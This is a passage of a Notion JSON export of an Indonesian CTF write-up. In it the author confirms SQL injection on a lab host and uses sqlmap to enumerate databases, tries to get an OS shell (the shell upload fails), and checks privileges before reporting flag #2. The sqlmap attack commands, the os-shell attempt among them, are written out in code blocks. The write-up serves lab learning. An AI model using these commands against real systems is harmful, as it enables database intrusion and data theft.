+          "rich_text": [
+            {
+              "content": "\nYups hasilnya kosong, sesuai harapan. Artinya ini ada SQL INjection. Setelah mengetahui terdapat SQL Injection, saya coba dengan sqlmap:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81b8-bc03-ef6d734712e7",
+        "type": "code",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "sqlmap -u \"http://10.10.0.127/api/users/?id=1\" --dbs --random-agent --tamper=space2comment",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "266db469-a81d-8121-b174-e9e4174f80da",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81cf-a2f1-f1c007ba40a4",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "hasil SQLMAP pada API:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-810f-b5c7-eca678af6fc3",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-13.png",
+          "expiry_time": "2025-09-18T02:37:21.127Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-13.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/04356735-6390-46c1-bc82-558ff00705eb/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=1eea17e8d4434145b67f1bae98052cdbb489dd41ef2678db9de5ae25856583f8&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-819d-93bc-cad58d71fa48",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8122-a42d-db5d7d6c2a4b",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Yups terdapat database db. Lanjut cek lagi yang ada di db. berikut hasilnya:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81d0-8c92-d778114f0b09",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81b8-8333-e10da55c9168",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-14.png",
+          "expiry_time": "2025-09-18T02:37:21.131Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-14.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/cafbd640-b0f9-4a4e-a572-d8dc6b5982c4/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=c1c3604c6f1df567d8d34e0bdca3aceac5d6f818182d1741f817c200ef805291&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-8197-83f0-c1a20706e079",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Pada gambar di atas, ada kolom hint, saya coba cek kolom nya. Berikut hasilnya",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81f3-aba5-d54bfc7a8a26",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8195-bf08-c7bcb7cb71cc",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-15.png",
+          "expiry_time": "2025-09-18T02:37:21.126Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-15.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/0617df7a-b7ac-4f2a-9ce7-b8618cc2e454/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=f72051e04ce9adba24cfa73ff6550ce994328e6c824559681c5ebb8727328b12&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-818b-a487-f2ee3fde043a",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81ee-b441-ee3d7add6710",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "oke dari hint, berarti flag nya ada di /tmp. saya tidak tau apakah flag tersebut flag ke 2 atau ketiga. Namun artinya kemungkinan saya harus masuk ke dalam server, dalam artian harus RCE. Saya coba remote shell lewat sqlmap:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81fc-8976-cc7db8d1f713",
+        "type": "code",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "sqlmap -u \"http://10.10.0.127/api/users/?id=1\" -D db --os-shell --random-agent --tamper=space2comment",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "266db469-a81d-81b1-8022-ff60b7a51401",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-16.png",
+          "expiry_time": "2025-09-18T02:37:21.130Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-16.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/a0abab04-481f-4a73-b8e4-f024c934955f/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=dc91f48b782c8ad15cb1855ace3cac89f05738584c52e67bd00a894eac710748&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-81cf-9dc7-fa5432371df2",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-816c-8871-f3a0adbb81c2",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "namun dari sekian banyaknya path yang dicek, ternyata tidak ada satupun yang bisa upload shell. ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-818e-8dc0-daae49977efc",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-17.png",
+          "expiry_time": "2025-09-18T02:37:21.126Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-17.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/4b903a44-62f6-4de7-a96f-b5ea94814538/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=792c7a235a7edcc01c7662682f3ccf32f7e1e2e5ca4553ff783c8a3c06d28f54&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-814d-a20d-c286c63f4019",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81bc-9df3-cc6696b972b3",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Untuk memastikannya saya coba cek user nya apakah ada permission buat write file atau tidak",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-811d-988a-d4bcf2659b2b",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81a4-9ec6-cfabe1063ed7",
+        "type": "code",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "sqlmap -u \"http://10.10.0.127/api/users/?id=231\" -p id --current-user --privileges",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "266db469-a81d-81b7-97f0-c154bd245c11",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8153-ac41-f48d503afe84",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-07T11:30:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-18.png",
+          "expiry_time": "2025-09-18T02:37:21.176Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-18.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/3ff4233e-fdea-4405-8007-7ea432daf4db/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=c80f2660935c602a411d7ada8d319dbaf4ba42fbb1d947bb53084f99ecc6a11e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-8192-b1e9-f61fa4b4b99e",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-811f-b008-ccd6d0ff58b4",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Dan viola! ternyata menemukan flag nya 😄. Saya coba submit dan itu flag #2. Next lanjut flag terakhir!",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
